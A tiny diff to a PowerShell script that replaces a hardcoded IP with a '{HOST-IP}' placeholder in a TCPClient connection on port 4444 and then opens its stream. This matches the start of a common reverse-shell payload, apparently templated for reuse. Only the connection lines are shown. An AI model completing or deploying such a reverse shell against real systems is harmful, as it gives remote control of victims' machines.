@@ -1,6 +1,6 @@
 
 # Socket Connection
-$client = New-Object System.Net.Sockets.TCPCLient("10.0.23", 4444);
+$client = New-Object System.Net.Sockets.TCPCLient("{HOST-IP}", 4444);
 $stream = $client.GetStream();
 
 
